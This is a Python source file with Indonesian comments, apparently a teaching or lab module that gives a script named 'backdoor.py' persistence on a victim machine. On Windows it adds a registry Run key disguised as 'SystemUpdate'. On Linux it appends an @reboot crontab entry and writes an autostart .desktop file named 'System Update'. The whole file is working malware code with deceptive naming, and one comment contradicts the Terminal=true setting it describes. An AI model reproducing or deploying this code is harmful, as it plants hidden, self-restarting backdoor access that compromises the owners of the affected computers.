import os
import platform
import subprocess
import sys

def make_persistence():
    # ==========================================================
    # [LANGKAH 1] MENGAMBIL PATH FILE BACKDOOR SECARA ABSOLUTE
    # ==========================================================
    # TUJUAN: AGAR FILE TETAP BISA DIJALANKAN MESKIPUN SCRIPT
    # DIEKSEKUSI DARI LOKASI YANG BERBEDA (CRON / AUTOSTART)
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        backdoor_path = os.path.join(current_dir, "backdoor.py")

        # MENGAMBIL PATH PYTHON YANG SEDANG DIGUNAKAN
        # INI LEBIH AMAN DIBANDING HARDCODE /usr/bin/python3
        python_path = sys.executable

        # MENDETEKSI SISTEM OPERASI
        os_type = platform.system()

    except Exception as e:
        return f"[ERROR] GAGAL INISIALISASI PATH: {e}"

    # ==========================================================
    # PERSISTENCE UNTUK WINDOWS (REGISTRY)
    # ==========================================================
    if os_type == "Windows":
        try:
            import winreg

            # PATH REGISTRY UNTUK AUTO STARTUP
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

            # MEMBUKA KEY REGISTRY
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                reg_path,
                0,
                winreg.KEY_SET_VALUE
            )

            # MENAMBAHKAN ENTRY AGAR SCRIPT JALAN SAAT STARTUP
            winreg.SetValueEx(
                key,
                "SystemUpdate",  # NAMA BEBAS (SIMULASI)
                0,
                winreg.REG_SZ,
                f'"{python_path}" "{backdoor_path}"'
            )

            winreg.CloseKey(key)

            return "[+] WINDOWS: PERSISTENCE REGISTRY BERHASIL"

        except Exception as e:
            return f"[ERROR WINDOWS]: {e}"

    # ==========================================================
    # PERSISTENCE UNTUK LINUX (KALI / UBUNTU)
    # ==========================================================
    elif os_type == "Linux":
        hasil = []

        # ------------------------------------------------------
        # METODE 1: CRONTAB (@REBOOT)
        # ------------------------------------------------------
        # TUJUAN: MENJALANKAN SCRIPT OTOMATIS SAAT SYSTEM REBOOT
        try:
            cron_command = f"@reboot {python_path} {backdoor_path}\n"

            # MENGAMBIL CRONTAB YANG SUDAH ADA (JIKA ADA)
            try:
                current_cron = subprocess.check_output(
                    "crontab -l 2>/dev/null",
                    shell=True
                ).decode()
            except:
                current_cron = ""

            # CEK AGAR TIDAK DUPLIKAT
            if backdoor_path not in current_cron:
                new_cron = current_cron + cron_command

                # MENULIS ULANG CRONTAB DENGAN ENTRY BARU
                process = subprocess.Popen(
                    ['crontab', '-'],
                    stdin=subprocess.PIPE
                )
                process.communicate(input=new_cron.encode())

                hasil.append("CRONTAB BERHASIL DITAMBAHKAN")
            else:
                hasil.append("CRONTAB SUDAH ADA (SKIP)")

        except Exception as e:
            hasil.append(f"CRONTAB GAGAL: {e}")

        # ------------------------------------------------------
        # METODE 2: AUTOSTART (.DESKTOP)
        # ------------------------------------------------------
        # TUJUAN: MENJALANKAN SCRIPT SAAT USER LOGIN (GUI)
        try:
            autostart_dir = os.path.expanduser("~/.config/autostart")

            # JIKA FOLDER BELUM ADA, BUAT FOLDER
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)

            desktop_file = os.path.join(autostart_dir, "system_update.desktop")

            # ISI FILE .DESKTOP
            desktop_content = f"""[Desktop Entry]
# MENENTUKAN BAHWA INI ADALAH APLIKASI YANG BISA DIEKSEKUSI
Type=Application

# NAMA APLIKASI (HANYA UNTUK IDENTIFIKASI DI SISTEM)
Name=System Update

# PERINTAH YANG AKAN DIJALANKAN SAAT AUTOSTART
# MENGGUNAKAN PYTHON_PATH AGAR SESUAI DENGAN ENVIRONMENT
Exec={python_path} {backdoor_path}

# MENENTUKAN AGAR TIDAK MEMBUKA TERMINAL (AGAR BERJALAN DI BACKGROUND)
Terminal=true

# MENGAKTIFKAN AUTOSTART DI DESKTOP ENVIRONMENT (GNOME / XFCE / KALI)
X-GNOME-Autostart-enabled=true
"""

            # MENULIS FILE .DESKTOP
            with open(desktop_file, "w") as f:
                f.write(desktop_content)

            # MEMBERIKAN IZIN EKSEKUSI
            os.chmod(desktop_file, 0o755)

            hasil.append("AUTOSTART BERHASIL DIBUAT")

        except Exception as e:
            hasil.append(f"AUTOSTART GAGAL: {e}")

        # MENGEMBALIKAN HASIL SEMUA METODE
        return "[+] LINUX RESULT: " + ", ".join(hasil)

    # ==========================================================
    # JIKA OS TIDAK DIKENALI
    # ==========================================================
    return "[-] OS TIDAK DIDUKUNG"